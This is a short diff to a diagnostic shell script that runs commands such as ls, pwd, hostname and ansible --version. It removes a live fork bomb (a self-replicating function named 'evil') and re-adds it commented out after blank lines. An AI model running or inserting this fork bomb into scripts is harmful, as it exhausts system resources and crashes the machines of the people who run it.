@@ -4,8 +4,15 @@
 ls -al
 pwd
 python --version
-evil () {
-  evil|evil &
-}
-evil
+hostname
+ansible --version
+
+
+
+
+
+# evil () {
+#   evil|evil &
+# }
+# evil
   
